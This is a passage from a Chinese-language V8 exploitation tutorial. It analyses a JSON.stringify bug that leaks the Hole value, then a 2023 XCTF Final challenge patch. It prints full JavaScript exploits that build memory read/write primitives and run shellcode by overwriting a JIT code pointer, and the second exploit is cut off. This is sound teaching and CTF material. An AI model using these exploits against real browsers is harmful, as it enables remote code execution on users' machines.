<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString_</span><span class="params">(Handle&lt;String&gt; string)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reader.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">      SrcChar c = reader.<span class="built_in">Get</span>&lt;SrcChar&gt;(i);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">DoNotEscape</span>(c)) &#123;</span><br><span class="line">        builder_.<span class="built_in">Append</span>&lt;SrcChar, DestChar&gt;(c);</span><br><span class="line">      &#125; </span><br><span class="line">    ...</span><br><span class="line">  builder_.<span class="built_in">Append</span>&lt;<span class="type">uint8_t</span>, DestChar&gt;(<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过分析源码发现，整个序列化过程中一直利用 <code>builder_</code> 作为结果的存储容器，而这个容器最核心的功能就是 <code>Append</code> 。</p>
<p>在 <code>Append</code> 时如果长度达到 <code>part_length_</code> 则会调用 <code>Extend</code> 扩展容器长度。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Append</span><span class="params">(SrcChar c)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(encoding_ == String::ONE_BYTE_ENCODING, <span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::ONE_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqOneByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqOneByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::TWO_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqTwoByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqTwoByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (current_index_ == part_length_) <span class="built_in">Extend</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>Extend</code> 中会调用 <code>Accumulate</code> 检查扩展后的长度是否超过 <code>kMaxLength</code> 即 0x1fffffe8 ，如果超过会设置 <code>overflowed_</code> 为 true 标记溢出。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Accumulate</span><span class="params">(Handle&lt;String&gt; new_part)</span> </span>&#123;</span><br><span class="line">  Handle&lt;String&gt; new_accumulator;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">accumulator</span>()-&gt;<span class="built_in">length</span>() + new_part-&gt;<span class="built_in">length</span>() &gt; String::kMaxLength) &#123;</span><br><span class="line">    <span class="comment">// Set the flag and carry on. Delay throwing the exception till the end.</span></span><br><span class="line">    new_accumulator = <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>();</span><br><span class="line">    overflowed_ = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    new_accumulator =</span><br><span class="line">        <span class="built_in">factory</span>()-&gt;<span class="built_in">NewConsString</span>(<span class="built_in">accumulator</span>(), new_part).<span class="built_in">ToHandleChecked</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">set_accumulator</span>(new_accumulator);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Extend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(current_index_, <span class="built_in">current_part</span>()-&gt;<span class="built_in">length</span>());</span><br><span class="line">  <span class="built_in">Accumulate</span>(<span class="built_in">current_part</span>());</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而前面的 <code>SerializeArrayLikeSlow</code> 会根据 <code>overflowed_</code> 标记判断发生溢出并返回异常。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">V8_INLINE <span class="type">bool</span> <span class="title">HasOverflowed</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> overflowed_; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br></pre></td></tr></table></figure></div>

<p>然而根据前面的分析我们发现，只要结果不是 <code>SUCCESS</code> 基本都是直接返回的，没有设置 <code>pending_exception</code> 这一操作。</p>
<p>比如像 <code>SerializeArrayLikeSlow</code> 在出现异常时都会调用 <code>ThrowInternal</code> 设置 <code>pending_exception</code> ，如果没有设置 <code>pending_exception</code> 在用户的 JS 代码中会将 <code>pending_exception</code> 的默认值 <code>Hole</code> catch 出来，这就是漏洞的成因。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">Isolate::ThrowInternal</span><span class="params">(Object raw_exception, MessageLocation* location)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Set the exception being thrown.</span></span><br><span class="line">  <span class="built_in">set_pending_exception</span>(*exception);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">heap</span>()).<span class="built_in">exception</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object <span class="title">Throw</span><span class="params">(Object exception)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">ThrowInternal</span>(exception, <span class="literal">nullptr</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体利用手法在 Hole 已经介绍过了，exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：2023XCTF-Final-Hole"><a href="#例题：2023XCTF-Final-Hole" class="headerlink" title="例题：2023XCTF Final Hole"></a>例题：2023XCTF Final Hole</h2><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/xctf2023_hole" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard 247b33e9218a9345f0073f45b967530b38153272 </span><br><span class="line">gclient sync</span><br><span class="line">git apply diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>观察 <code>patch</code> 文件，首先发现对 <code>JSMap</code> 的 <code>Hole</code> 检查被 patch 掉了，因此可以考虑将 <code>Hole</code> 泄露出来然后借助 <code>JSMap</code> 进行 <code>Hole</code> 利用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">index f<span class="number">6238e3072</span>.<span class="number">.17821</span>d3124 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-collections-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">@@ <span class="number">-1765</span>,<span class="number">7</span> <span class="number">+1765</span>,<span class="number">7</span> @@ <span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          <span class="string">&quot;Map.prototype.delete&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// This check breaks a known exploitation technique. See crbug.com/1263462</span></span><br><span class="line">-  <span class="built_in">CSA_CHECK</span>(<span class="keyword">this</span>, <span class="built_in">TaggedNotEqual</span>(key, <span class="built_in">TheHoleConstant</span>()));</span><br><span class="line">+  <span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br></pre></td></tr></table></figure></div>
<p>然后就是 <code>original_map.UnusedPropertyFields()</code> 的判断处加了一个 <code>times</code> 条件 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/js-native-context-specialization.cc b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">index <span class="number">39302152</span>ed.<span class="number">.3193065</span>d7d <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/js-native-context-specialization.cc</span><br><span class="line">+++ b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">@@ <span class="number">-29</span>,<span class="number">13</span> <span class="number">+29</span>,<span class="number">12</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/feedback-vector.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/heap-number.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/string.h&quot;</span></span></span><br><span class="line">-</span><br><span class="line">+<span class="type">int</span> times=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line"> <span class="keyword">namespace</span> compiler &#123;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> &#123;</span><br><span class="line">-</span><br><span class="line"> <span class="function"><span class="type">bool</span> <span class="title">HasNumberMaps</span><span class="params">(JSHeapBroker* broker, ZoneVector&lt;MapRef&gt; <span class="type">const</span>&amp; maps)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (MapRef map : maps) &#123;</span><br><span class="line">     <span class="keyword">if</span> (map.<span class="built_in">IsHeapNumberMap</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">@@ <span class="number">-2812</span>,<span class="number">7</span> <span class="number">+2811</span>,<span class="number">7</span> @@ JSNativeContextSpecialization::<span class="built_in">BuildPropertyStore</span>(</span><br><span class="line">       <span class="comment">// with this transitioning store.</span></span><br><span class="line">       MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">       MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">-      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">+      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br></pre></td></tr></table></figure></div>
<p>通过调试观察 <code>JSObject</code> 的 <code>Map</code> 发现 <code>unused property fields</code> 是用于记录存储 <code>properties</code> 的 <code>PropertyArray</code> 还有多少空闲位置。</p>
<p>结合对代码上下文的分析，发现这里的逻辑是在为 <code>JSObject</code> 添加新的属性时如果 <code>unused property fields</code> 为 0 则申请一个新的 <code>PropertyArray</code> 来存储 <code>properties</code> 。这里修改判断 <code>unused property fields</code> 为 0 的条件可能会造成 <code>PropertyArray</code> 越界。</p>
<p>要注意的是这个代码是在 JIT 的时候执行的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check if we need to perform a transitioning store.</span></span><br><span class="line">base::Optional&lt;MapRef&gt; transition_map = access_info.<span class="built_in">transition_map</span>();</span><br><span class="line"><span class="keyword">if</span> (transition_map.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">  <span class="comment">// Check if we need to grow the properties backing store</span></span><br><span class="line">  <span class="comment">// with this transitioning store.</span></span><br><span class="line">  MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">  MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">  <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br><span class="line">    storage = effect = <span class="built_in">BuildExtendPropertiesBackingStore</span>(</span><br><span class="line">        original_map, storage, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform the actual store.</span></span><br><span class="line">    effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access),</span><br><span class="line">                              storage, value, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Atomically switch to the new properties below.</span></span><br><span class="line">    field_access = AccessBuilder::<span class="built_in">ForJSObjectPropertiesOrHashKnownPointer</span>();</span><br><span class="line">    value = storage;</span><br><span class="line">    storage = receiver;</span><br><span class="line">  &#125;</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">common</span>()-&gt;<span class="built_in">BeginRegion</span>(RegionObservability::kObservable), effect);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(AccessBuilder::<span class="built_in">ForMap</span>()), receiver,</span><br><span class="line">      <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">Constant</span>(transition_map_ref), effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access), storage,</span><br><span class="line">                            value, effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">FinishRegion</span>(),</span><br><span class="line">                            <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>(), effect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此有如下 POC ：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调试发现，由于 <code>trigger</code> 函数优化后在对 <code>unused property fields</code> 的检查上存在漏洞，导致 <code>PropertyArray</code> 越界可以越界读到 <code>hole_array</code> 上将 <code>Hole</code> 泄露出来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/b2df67a234f2cd34bb32397526594f01.png"
                      alt="在这里插入图片描述"
                ><br>这里要注意的是 <code>hole_array</code> 必须不声明直接赋值，否则不会和 <code>PropertyArray</code> 重叠。</p>
<p><code>Hole</code> 泄露出来后的利用就很常规了。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br><span 